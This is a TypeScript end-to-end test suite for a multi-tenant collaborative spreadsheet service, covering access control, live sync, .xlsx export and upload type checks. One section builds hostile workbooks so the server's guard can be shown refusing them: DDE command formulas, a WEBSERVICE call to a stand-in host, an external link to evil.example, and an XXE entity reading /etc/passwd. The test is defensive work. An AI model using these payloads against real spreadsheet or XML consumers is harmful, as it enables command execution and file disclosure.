// ============================================================================
//  TatvaOS Sheets — end-to-end checks against a running API
// ============================================================================
//
//  Drives the real endpoints and the real WebSocket with the real model
//  (lib/sheets/model.ts) and the real .xlsx writer and reader, as three
//  people: the owner and an employee of tenant 1, and a person in tenant 2.
//  Each check says what it proves; the run ends with a count and exits
//  non-zero if anything failed.
//
//    node --import ./tests/sheets/register.mjs tests/sheets/sheets-live.e2e.ts
//
//  Environment: SHEETS_API (default http://localhost:5151/api) and
//  SHEETS_PHONES "owner,employee,otherTenant" (default the local seed
//  numbers +919999900002/3/4). The local stack must show OTP codes on
//  screen. NOT for production: it signs in with on-screen codes.
//
//  TRAP (see tests/docs/docs-live.test.mjs): the OTP request returns its
//  code only on the first request inside the 60-second resend window.
//  Wait a minute between runs.
// ============================================================================

import * as Y from '../../apps/web/node_modules/yjs/dist/yjs.mjs';
import { SheetsModel } from '../../apps/web/lib/sheets/model.ts';
import { writeXlsx, readXlsx } from '../../apps/web/lib/sheets/io/xlsx.ts';
import { readZip, writeZip } from '../../apps/web/lib/sheets/io/zip.ts';
import { emptySheet, cellKey } from '../../apps/web/lib/sheets/workbook.ts';

const API = process.env.SHEETS_API ?? 'http://localhost:5151/api';
// The platform operator, who switches Docs (and so Sheets) on per organisation.
const [ADMIN_EMAIL, ADMIN_PASSWORD] = (process.env.DOCS_ADMIN ?? 'platform@docs.local,dev-only-platform-pass').split(',') as [string, string];
const [TENANT_A, TENANT_C] = (process.env.DOCS_TENANTS
  ?? '11111111-1111-1111-1111-111111111111,22222222-2222-2222-2222-222222222222').split(',') as [string, string];
const [OWNER, EMPLOYEE, OTHER] = (process.env.SHEETS_PHONES ?? '+919999900002,+919999900003,+919999900004').split(',') as [string, string, string];

let passed = 0;
let failed = 0;
function check(name: string, ok: boolean, detail = '') {
  if (ok) { passed += 1; console.log(`  ok    ${name}`); }
  else { failed += 1; console.log(`  FAIL  ${name}${detail ? `  — ${detail}` : ''}`); }
}
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
const b64 = (u8: Uint8Array) => Buffer.from(u8).toString('base64');

async function signIn(phone: string) {
  const r1 = await fetch(`${API}/auth/otp/request`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone }) });
  const b1 = await r1.json() as { devCode?: string };
  if (!b1.devCode) throw new Error(`no devCode for ${phone.slice(0, 6)}… (status ${r1.status}); wait 60 s and rerun`);
  const r2 = await fetch(`${API}/auth/otp/verify`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone, code: b1.devCode }) });
  const b2 = await r2.json() as { accessToken?: string; user?: { id: string } };
  if (!b2.accessToken) throw new Error(`verify failed for ${phone.slice(0, 6)}… (status ${r2.status})`);
  return { token: b2.accessToken, id: b2.user!.id };
}

type Call = (p: string, init?: RequestInit) => Promise<{ status: number; body: any; headers: Headers; bytes: Uint8Array }>;
function client(who: { token: string }): Call {
  return async (p, init = {}) => {
    const res = await fetch(`${API}${p}`, {
      ...init,
      headers: { ...(init.body === undefined ? {} : { 'Content-Type': 'application/json' }), Authorization: `Bearer ${who.token}` },
    });
    const bytes = new Uint8Array(await res.arrayBuffer());
    let body: unknown = null;
    try { body = JSON.parse(new TextDecoder().decode(bytes)); } catch { body = null; }
    return { status: res.status, body, headers: res.headers, bytes };
  };
}

// ---- the live channel: a minimal browser, wired as lib/docsLive.ts is -------

const MSG = { update: 1, ack: 4, synced: 5, event: 6, state: 7 };
const seqOf = (b: Uint8Array) => Number(new DataView(b.buffer, b.byteOffset + 1, 8).getBigInt64(0));

async function connect(call: Call, id: string) {
  const t = await call(`/docs/${id}/live-ticket`, { method: 'POST' });
  if (t.status !== 200) return null;
  const ws = new WebSocket(API.replace(/^http/, 'ws') + `/docs/${id}/live?ticket=${encodeURIComponent(t.body.ticket)}`);
  ws.binaryType = 'arraybuffer';
  const doc = new Y.Doc();
  const s = { doc, ws, synced: false, lastSeq: 0, acks: 0, events: [] as { type: string; perm?: string }[], model: null as SheetsModel | null };
  ws.onmessage = (ev) => {
    const b = new Uint8Array(ev.data as ArrayBuffer);
    switch (b[0]) {
      case MSG.state: if (b.length > 9) Y.applyUpdate(doc, b.subarray(9), 'server'); s.lastSeq = Math.max(s.lastSeq, seqOf(b)); break;
      case MSG.update: Y.applyUpdate(doc, b.subarray(9), 'server'); s.lastSeq = Math.max(s.lastSeq, seqOf(b)); break;
      case MSG.ack: s.acks += 1; s.lastSeq = Math.max(s.lastSeq, seqOf(b)); break;
      case MSG.synced: s.synced = true; s.lastSeq = Math.max(s.lastSeq, seqOf(b)); break;
      case MSG.event: s.events.push(JSON.parse(new TextDecoder().decode(b.subarray(1)))); break;
    }
  };
  doc.on('update', (u: Uint8Array, origin: unknown) => {
    if (origin === 'server') return;
    const f = new Uint8Array(u.length + 1); f[0] = MSG.update; f.set(u, 1);
    if (ws.readyState === WebSocket.OPEN) ws.send(f);
  });
  for (let i = 0; i < 50 && !s.synced; i += 1) await sleep(100);
  s.model = new SheetsModel(doc);
  return s;
}

async function waitFor(fn: () => boolean, ms = 3000) {
  for (let i = 0; i < ms / 50; i += 1) { if (fn()) return true; await sleep(50); }
  return fn();
}

// ============================================================================

async function main() {
  console.log(`Sheets end-to-end against ${API}\n`);
  const owner = await signIn(OWNER);
  const employee = await signIn(EMPLOYEE);
  const other = await signIn(OTHER);
  const A = client(owner), B = client(employee), C = client(other);
  const login = await fetch(`${API}/auth/login`, { method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email: ADMIN_EMAIL, password: ADMIN_PASSWORD }) });
  const adminBody = await login.json().catch(() => ({})) as { accessToken?: string };
  if (!adminBody.accessToken) throw new Error(`platform operator sign-in failed (status ${login.status})`);
  const P = client({ token: adminBody.accessToken });

  const sw = (product: 'docs' | 'sheets', tenantId: string, enabled: boolean) =>
    P(`/admin/organisations/${tenantId}/${product}`, { method: 'PUT', body: JSON.stringify({ enabled }) });

  console.log('Sheets has its own switch, independent of Docs');
  await sw('sheets', TENANT_A, false);
  await sw('docs', TENANT_A, true);
  check('Sheets reports off while Docs reports on', (await A('/sheets/status')).body?.enabled === false
    && (await A('/docs/status')).body?.enabled === true);
  const offCreate = await A('/docs', { method: 'POST', body: JSON.stringify({ kind: 'spreadsheet' }) });
  check('Sheets off: creating a spreadsheet is refused (403 sheets_off)', offCreate.status === 403 && offCreate.body?.reason === 'sheets_off',
    `${offCreate.status} ${JSON.stringify(offCreate.body)}`);
  check('Sheets off: the Sheets list is refused (403)', (await A('/docs?kind=spreadsheet')).status === 403);
  const docWhileOff = await A('/docs', { method: 'POST', body: JSON.stringify({ title: 'E2E doc while Sheets off' }) });
  check('…while Docs, on its own switch, still creates documents (201)', docWhileOff.status === 201, `${docWhileOff.status}`);
  const selfOn = await A(`/admin/organisations/${TENANT_A}/sheets`, { method: 'PUT', body: JSON.stringify({ enabled: true }) });
  check('an organisation owner cannot switch Sheets on (403)', selfOn.status === 403, `${selfOn.status}`);
  check('the operator switches Sheets on for both organisations',
    (await sw('sheets', TENANT_A, true)).status === 200 && (await sw('sheets', TENANT_C, true)).status === 200);
  // The other organisation ON as well (Docs too, for the document checks):
  // its 404s below must mean "cannot see it", not "switched off here" (403),
  // which would pass for the wrong reason — measured on an earlier run.
  await sw('docs', TENANT_C, true);
  check('Sheets now reports on', (await A('/sheets/status')).body?.enabled === true);

  console.log('Create, list, visibility');
  const created = await A('/docs', { method: 'POST', body: JSON.stringify({ title: 'E2E fees', scope: 'personal', kind: 'spreadsheet' }) });
  check('owner creates a spreadsheet (201)', created.status === 201, `${created.status} ${JSON.stringify(created.body)}`);
  const id = created.body.id as string;
  const bad = await A('/docs', { method: 'POST', body: JSON.stringify({ kind: 'slides' }) });
  check('an unknown kind is refused (400)', bad.status === 400, `${bad.status}`);

  const sheetsList = await A('/docs?kind=spreadsheet&view=owned');
  const docsList = await A('/docs?view=owned');
  check('it is in the Sheets list', sheetsList.body.documents.some((d: { id: string }) => d.id === id));
  // Calibrated by the check above: the same row, the other list.
  check('it is NOT in the Docs list', !docsList.body.documents.some((d: { id: string }) => d.id === id));
  check('its Space file carries the spreadsheet type',
    sheetsList.body.documents.find((d: { id: string }) => d.id === id)?.mimeType === 'application/vnd.tatvaos.spreadsheet');

  check('owner opens it (200, level owner)', (await A(`/docs/${id}`)).body?.myPermission === 'owner');
  check('the server reports its kind as spreadsheet (each editor refuses the other kind)', (await A(`/docs/${id}`)).body?.kind === 'spreadsheet');
  check('unshared colleague gets 404', (await B(`/docs/${id}`)).status === 404);
  check('other organisation gets 404', (await C(`/docs/${id}`)).status === 404);
  check('other organisation cannot get a live ticket', (await C(`/docs/${id}/live-ticket`, { method: 'POST' })).status === 404);
  const cList = await C('/docs?kind=spreadsheet&view=recent');
  check("other organisation's Sheets list does not include it", cList.status === 200 && !cList.body.documents.some((d: { id: string }) => d.id === id));

  console.log('Live editing: two connections, one spreadsheet');
  const a1 = await connect(A, id);
  const a2 = await connect(A, id);
  check('two connections sync', !!a1?.synced && !!a2?.synced);
  a1!.model!.ensureSeeded();
  a2!.model!.ensureSeeded(); // both seed at once, as two people opening a new sheet would
  await waitFor(() => a1!.acks >= 1 && a2!.acks >= 1);
  await sleep(300);
  check('two simultaneous seeds make ONE sheet, not two', a1!.model!.sheets().length === 1 && a2!.model!.sheets().length === 1,
    `a1 ${a1!.model!.sheets().map((s) => s.name)} a2 ${a2!.model!.sheets().map((s) => s.name)}`);

  const s1 = a1!.model!.sheetIds()[0]!;
  a1!.model!.setInputs(s1, [
    { r: 0, c: 0, input: 'Fee' }, { r: 1, c: 0, input: '₹1,25,000' }, { r: 2, c: 0, input: '75000' },
    { r: 3, c: 0, input: '=SUM(A2:A3)' },
  ]);
  const got = await waitFor(() => a2!.model!.value(s1, 3, 0) === 200000);
  check("the other connection calculates the sum of the first's edits (200000)", got, `saw ${JSON.stringify(a2!.model!.value(s1, 3, 0))}`);

  // A row inserted by one person while the other types below it: the typed
  // value must stay in its row, and the formula must follow.
  // a2 types beside the row it SEES holding ₹1,25,000, in the same instant
  // a1 inserts a row above it — so a2 has not yet seen the insert, and its
  // row number for ₹1,25,000 is stale by the time the edit lands.
  const seen = [0, 1, 2, 3].find((r) => a2!.model!.input(s1, r, 0) === '₹1,25,000')!;
  a1!.model!.insert(s1, 'row', 1, 1);
  a2!.model!.setInputs(s1, [{ r: seen, c: 1, input: 'typed beside ₹1,25,000' }]);
  await sleep(600);
  const row = (m: SheetsModel) => [m.input(s1, 2, 0), m.input(s1, 2, 1) ?? m.input(s1, 3, 1)];
  check('after a concurrent insert, both see the same cells',
    JSON.stringify(row(a1!.model!)) === JSON.stringify(row(a2!.model!)), `${JSON.stringify(row(a1!.model!))} vs ${JSON.stringify(row(a2!.model!))}`);
  const typedRow = [0, 1, 2, 3, 4].find((r) => a1!.model!.input(s1, r, 1) === 'typed beside ₹1,25,000');
  check('the value typed beside ₹1,25,000 is still beside it', typedRow !== undefined && a1!.model!.input(s1, typedRow, 0) === '₹1,25,000',
    `typed at row ${typedRow}, A there = ${typedRow === undefined ? '-' : a1!.model!.input(s1, typedRow, 0)}`);
  check('the SUM moved down with its rows and still totals 200000',
    a1!.model!.input(s1, 4, 0) === '=SUM(A3:A4)' && a1!.model!.value(s1, 4, 0) === 200000,
    `${a1!.model!.input(s1, 4, 0)} = ${JSON.stringify(a1!.model!.value(s1, 4, 0))}`);

  console.log('Checkpoint: the Space copy is a real .xlsx');
  const snap = a1!.model!.snapshot();
  const xlsx = await writeXlsx(snap);
  const cp = await A(`/docs/${id}/checkpoint`, { method: 'POST', body: JSON.stringify({
    state: b64(Y.encodeStateAsUpdate(a1!.doc)), upToSeq: a1!.lastSeq, html: '<table></table>', text: 'Fee', xlsx: b64(xlsx),
  }) });
  check('checkpoint with an .xlsx is accepted', cp.status === 200 && cp.body?.saved === true, `${cp.status} ${JSON.stringify(cp.body)}`);
  const noX = await A(`/docs/${id}/checkpoint`, { method: 'POST', body: JSON.stringify({
    state: b64(Y.encodeStateAsUpdate(a1!.doc)), upToSeq: a1!.lastSeq, html: '', text: '' }) });
  check('a spreadsheet checkpoint WITHOUT its .xlsx is refused (400)', noX.status === 400, `${noX.status}`);
  const notZip = await A(`/docs/${id}/checkpoint`, { method: 'POST', body: JSON.stringify({
    state: b64(Y.encodeStateAsUpdate(a1!.doc)), upToSeq: a1!.lastSeq, html: '', text: '', xlsx: b64(new TextEncoder().encode('<html>not a zip</html>')) }) });
  check('an .xlsx that is not a zip is refused (400)', notZip.status === 400, `${notZip.status}`);

  const dl = await A(`/space/files/${id}/content`);
  check('Space download answers 200', dl.status === 200, `${dl.status}`);
  check('…typed as an Excel file', (dl.headers.get('content-type') ?? '').includes('spreadsheetml'), dl.headers.get('content-type') ?? '');
  check('…named .xlsx', /\.xlsx/.test(dl.headers.get('content-disposition') ?? ''), dl.headers.get('content-disposition') ?? '');
  let readBack = null;
  try { readBack = await readXlsx(dl.bytes); } catch (e) { readBack = null; console.log('   ', e); }
  const cell = readBack?.sheets[0]?.cells.get('4,0');
  check('…and it reads back with the formula and its value', cell?.input === '=SUM(A3:A4)' && cell?.value === 200000, JSON.stringify(cell));

  console.log('The server refuses a workbook that would attack whoever opens it');
  // XlsxGuard.cs (Mr. Singh, 25 Sept 2026). Formulas are ordinary content and
  // pass; macros, embedded objects, links outside the file and calling-out
  // formulas are refused. Every refusal has its permit twin in this run.
  const send = (bytes: Uint8Array) => A(`/docs/${id}/checkpoint`, { method: 'POST', body: JSON.stringify({
    state: b64(Y.encodeStateAsUpdate(a1!.doc)), upToSeq: a1!.lastSeq, html: '<table></table>', text: 'Fee', xlsx: b64(bytes) }) });

  // Permit 1: an ordinary workbook with ordinary formulas (incl. HYPERLINK, and "|" inside text).
  const plainSheet = emptySheet('Fees');
  plainSheet.cells.set(cellKey(0, 0), { input: '10' });
  plainSheet.cells.set(cellKey(1, 0), { input: '=SUM(A1:A1)*2', value: 20 });
  plainSheet.cells.set(cellKey(2, 0), { input: '=IF(A1>5,"big|small","no")', value: 'big|small' });
  plainSheet.cells.set(cellKey(3, 0), { input: '=HYPERLINK("https://tatvaos.com","site")', value: 'site' });
  plainSheet.cells.set(cellKey(4, 0), { input: '=VLOOKUP(A1,A1:A2,1,FALSE)', value: 10 });
  const plainXlsx = await writeXlsx({ sheets: [plainSheet] });
  const permit1 = await send(plainXlsx);
  check('permit: an ordinary workbook with ordinary formulas is stored (200)', permit1.status === 200, `${permit1.status} ${JSON.stringify(permit1.body)}`);

  // Permit 2: the honest editor given dangerous INPUT writes it as text — never refused.
  const honest = emptySheet('Fees');
  honest.cells.set(cellKey(0, 0), { input: "=cmd|' /c calc'!A0" });
  honest.cells.set(cellKey(1, 0), { input: '=WEBSERVICE("https://x.example/"&A1)' });
  honest.cells.set(cellKey(2, 0), { input: "='[Budget.xlsx]Sheet1'!A1" });
  const permit2 = await send(await writeXlsx({ sheets: [honest] }));
  check('permit: what the editor writes from dangerous-looking input is stored (it became text)', permit2.status === 200,
    `${permit2.status} ${JSON.stringify(permit2.body)}`);

  // The hostile variants, each built from the ordinary workbook's own parts.
  const base = await readZip(plainXlsx);
  const text = (name: string) => new TextDecoder().decode(base.get(name)!);
  const build = async (changes: Record<string, string | Uint8Array | null>) => {
    const files = new Map(base);
    for (const [name, v] of Object.entries(changes)) {
      if (v === null) files.delete(name); else files.set(name, typeof v === 'string' ? new TextEncoder().encode(v) : v);
    }
    return writeZip([...files].map(([name, data]) => ({ name, data })));
  };
  const withFormula = (f: string) => text('xl/worksheets/sheet1.xml').replace(/<f>SUM\(A1:A1\)\*2<\/f>/, `<f>${f}</f>`);
  // Permit 3: the same substitution with an ordinary formula goes through — so each
  // refusal below is the RULE firing, not the substitution breaking the file.
  const permit3 = await send(await build({ 'xl/worksheets/sheet1.xml': withFormula('&quot;a|b[c]&quot;&amp;A1') }));
  check('permit: a hand-substituted formula with "|" and "[" only inside quoted text is stored', permit3.status === 200,
    `${permit3.status} ${JSON.stringify(permit3.body)}`);
  check('…and the substitution really happened (calibration)', withFormula('X') !== text('xl/worksheets/sheet1.xml'));

  const hostile: [string, string, Record<string, string | Uint8Array | null>][] = [
    ['a macro project (vbaProject.bin)', 'macro_or_binary_part', { 'xl/vbaProject.bin': new Uint8Array([1, 2, 3]) }],
    ['a macro-enabled content type', 'macro_content_type', { '[Content_Types].xml': text('[Content_Types].xml').replace('</Types>',
      '<Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/></Types>') }],
    ['an embedded object', 'embedded_object', { 'xl/embeddings/Microsoft_Word_Document.docx': new Uint8Array([80, 75, 3, 4]) }],
    ['an external-link part', 'external_link', { 'xl/externalLinks/externalLink1.xml': '<externalLink/>' }],
    ['a data connection', 'data_connection', { 'xl/connections.xml': '<connections/>' }],
    ['a relationship pointing outside the file', 'external_relationship', { 'xl/_rels/workbook.xml.rels': text('xl/_rels/workbook.xml.rels').replace('</Relationships>',
      '<Relationship Id="rX" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://evil.example/" TargetMode="External"/></Relationships>') }],
    ['a DDE formula', 'calling_out_formula', { 'xl/worksheets/sheet1.xml': withFormula("cmd|' /c calc'!A0") }],
    ['a formula into another workbook', 'calling_out_formula', { 'xl/worksheets/sheet1.xml': withFormula('[1]Sheet1!A1') }],
    ['a web-fetching formula', 'calling_out_formula', { 'xl/worksheets/sheet1.xml': withFormula('_xlfn.WEBSERVICE(&quot;https://x.example/&quot;&amp;A1)') }],
    ['a defined name that runs DDE', 'calling_out_formula', { 'xl/workbook.xml': text('xl/workbook.xml').replace('</workbook>',
      '<definedNames><definedName name="evil">cmd|\' /c calc\'!A0</definedName></definedNames></workbook>') }],
    ['a DOCTYPE', 'doctype', { 'xl/sharedStrings.xml': '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><sst/>' }],
  ];
  for (const [label, reason, changes] of hostile) {
    const r = await send(await build(changes));
    check(`refused: ${label} (400 ${reason})`, r.status === 400 && r.body?.reason === reason, `${r.status} ${JSON.stringify(r.body)}`);
  }
  // Put the real workbook back as the Space copy for the checks that follow.
  const restored = await send(xlsx);
  check('the real workbook is stored again', restored.status === 200, `${restored.status}`);

  console.log('Documents and spreadsheets do not cross');
  const doc = await A('/docs', { method: 'POST', body: JSON.stringify({ title: 'E2E doc', scope: 'personal' }) });
  const docCp = await A(`/docs/${doc.body.id}/checkpoint`, { method: 'POST', body: JSON.stringify({
    state: b64(new Y.Doc() && Y.encodeStateAsUpdate(new Y.Doc())), upToSeq: 0, html: '<p>x</p>', text: 'x', xlsx: b64(xlsx) }) });
  check('a DOCUMENT checkpoint carrying an .xlsx is refused (400)', docCp.status === 400, `${docCp.status}`);
  const docAi = await A(`/sheets/${doc.body.id}/ai`, { method: 'POST', body: JSON.stringify({ action: 'analyze', context: 'a\tb' }) });
  check('Sheets AI on a document is 404', docAi.status === 404, `${docAi.status}`);

  console.log('Space protects the spreadsheet');
  const form = new FormData();
  form.append('file', new Blob([new TextEncoder().encode('overwrite')]), 'x.xlsx');
  const ow = await fetch(`${API}/space/files/${id}/content`, { method: 'PUT', headers: { Authorization: `Bearer ${owner.token}` }, body: form });
  check('replacing the Space file\'s content is refused (409)', ow.status === 409, `${ow.status}`);

  console.log('Sheets AI');
  const ai = await A(`/sheets/${id}/ai`, { method: 'POST', body: JSON.stringify({ action: 'formula', prompt: 'total fees', context: 'Sheet: Sheet1' }) });
  check('owner reaches the AI endpoint (200, or 503/403 when AI is off here)', [200, 403, 503].includes(ai.status), `${ai.status} ${JSON.stringify(ai.body)}`);
  if (ai.status === 200) check('…and a formula comes back starting with =', typeof ai.body.text === 'string' && ai.body.text.startsWith('='), ai.body.text);
  check('other organisation gets 404 from the AI endpoint', (await C(`/sheets/${id}/ai`, { method: 'POST', body: JSON.stringify({ action: 'formula', prompt: 'x' }) })).status === 404);
  check('an unknown AI action is 400 (when AI is on) or the AI-off answer', [400, 403, 503].includes(
    (await A(`/sheets/${id}/ai`, { method: 'POST', body: JSON.stringify({ action: 'nope' }) })).status));

  console.log("A file's type is the server's: Space never stores the reserved types a client claims");
  // Mr. Singh, 24 Sept: the switch now keys on the file's type, so the type
  // must be something no client can set. Each refusal below has its PERMIT
  // beside it in the same run — the same call with an ordinary type goes
  // through — so a refusal can never be passing because nothing works.
  const upload = async (type: string, name: string) => {
    const body = new TextEncoder().encode('Name,Fee' + String.fromCharCode(10) + 'Aarav,48000');
    const f = new FormData();
    f.append('scope', 'personal');
    f.append('sizeBytes', String(body.length));
    f.append('file', new Blob([body], { type }), name);
    const r = await fetch(`${API}/space/files`, { method: 'POST', headers: { Authorization: `Bearer ${owner.token}` }, body: f });
    return { status: r.status, body: await r.json().catch(() => null) as { id: string; mimeType: string } | null };
  };
  const overwrite = async (fileId: string, type: string) => {
    const body = new TextEncoder().encode('replaced');
    const f = new FormData();
    f.append('sizeBytes', String(body.length));
    f.append('file', new Blob([body], { type }), 'x');
    const r = await fetch(`${API}/space/files/${fileId}/content`, { method: 'PUT', headers: { Authorization: `Bearer ${owner.token}` }, body: f });
    return { status: r.status, body: await r.json().catch(() => null) as { mimeType: string } | null };
  };
  const plain = await upload('text/csv', 'fees.csv');
  check('permit: an upload keeps an ordinary type it declares (text/csv)', plain.status === 201 && plain.body?.mimeType === 'text/csv',
    `${plain.status} ${plain.body?.mimeType}`);
  for (const [label, type] of [['spreadsheet', 'application/vnd.tatvaos.spreadsheet'], ['document', 'application/vnd.tatvaos.document']] as const) {
    const forged = await upload(type, `forged-${label}`);
    check(`an upload claiming the ${label} type is stored as something else`, forged.status === 201 && forged.body?.mimeType !== type,
      `${forged.status} stored as ${forged.body?.mimeType}`);
    const listed = await A(`/docs?kind=${label}&view=owned`);
    check(`…and it is not in the ${label} list`, listed.status === 200 && !listed.body.documents.some((d: { id: string }) => d.id === forged.body?.id));
  }
  const reTyped = await overwrite(plain.body!.id, 'text/plain');
  check('permit: overwriting a file may change it to an ordinary type (text/plain)', reTyped.status === 200 && reTyped.body?.mimeType === 'text/plain',
    `${reTyped.status} ${reTyped.body?.mimeType}`);
  const forgedOver = await overwrite(plain.body!.id, 'application/vnd.tatvaos.spreadsheet');
  check('overwriting a file cannot turn it into a spreadsheet', forgedOver.status === 200 && forgedOver.body?.mimeType !== 'application/vnd.tatvaos.spreadsheet',
    `${forgedOver.status} ${forgedOver.body?.mimeType}`);
  check('overwriting a real spreadsheet is still refused (409)', (await overwrite(id, 'text/plain')).status === 409);

  console.log('Each switch reaches only its own kind');
  const docId = docWhileOff.body.id as string;
  check('…and a document’s kind as document', (await A(`/docs/${docId}`)).body?.kind === 'document');
  await sw('docs', TENANT_A, false);
  check('Docs off: the document is refused (403 docs_off)', (await A(`/docs/${docId}`)).body?.reason === 'docs_off');
  check('…but the spreadsheet still opens (200)', (await A(`/docs/${id}`)).status === 200);
  check('…and its AI is not blocked by the Docs switch', (await A(`/sheets/${id}/ai`, { method: 'POST', body: JSON.stringify({ action: 'nope' }) })).body?.reason !== 'docs_off');
  await sw('docs', TENANT_A, true);

  const live = await connect(A, id);
  check('a live connection to the spreadsheet is open', !!live?.synced);
  await sw('sheets', TENANT_A, false);
  const refused = await A(`/docs/${id}`);
  check('Sheets off: the spreadsheet is refused at once (403 sheets_off)', refused.status === 403 && refused.body?.reason === 'sheets_off',
    `${refused.status} ${JSON.stringify(refused.body)}`);
  check('…its AI is refused at once (403)', (await A(`/sheets/${id}/ai`, { method: 'POST', body: JSON.stringify({ action: 'analyze', context: 'a	b' }) })).status === 403);
  check('…while the document opens (200)', (await A(`/docs/${docId}`)).status === 200);
  // Rule (Mr. Singh, 24 Sept): switching a product off withdraws the editor,
  // never the customer's data. The same download answered 200 while on (the
  // Space-copy checks above); it must still answer, as an .xlsx, while off.
  const offDl = await A(`/space/files/${id}/content`);
  check('Sheets off: the organisation can still download the spreadsheet from Space (200, .xlsx)',
    offDl.status === 200 && (offDl.headers.get('content-type') ?? '').includes('spreadsheetml'),
    `${offDl.status} ${offDl.headers.get('content-type')}`);
  let offRead = null;
  try { offRead = await readXlsx(offDl.bytes); } catch { offRead = null; }
  check('…and the download is the real workbook, not an empty shell', offRead?.sheets[0]?.cells.get('4,0')?.value === 200000,
    JSON.stringify(offRead?.sheets[0]?.cells.get('4,0')));
  const offList = await A('/space/list?scope=personal');
  check('…and Space still lists it', offList.status === 200 && JSON.stringify(offList.body).includes(id), `${offList.status}`);
  let closed: number | null = null;
  live!.ws.onclose = (ev) => { closed = ev.code; };
  await waitFor(() => closed !== null, 60_000);
  check('…and the open spreadsheet is closed with 4403 within a minute', closed === 4403, `close code ${closed}`);
  await sw('sheets', TENANT_A, true);
  const back = await A(`/docs/${id}`);
  check('switched back on, the spreadsheet is still there', back.status === 200 && back.body?.title === 'E2E fees', `${back.status}`);

  for (const s of [a1, a2]) { s?.model?.destroy(); s?.ws.close(); }
  console.log(`\n${passed} passed, ${failed} failed`);
  process.exit(failed === 0 ? 0 : 1);
}

main().catch((e) => { console.error(e); process.exit(2); });
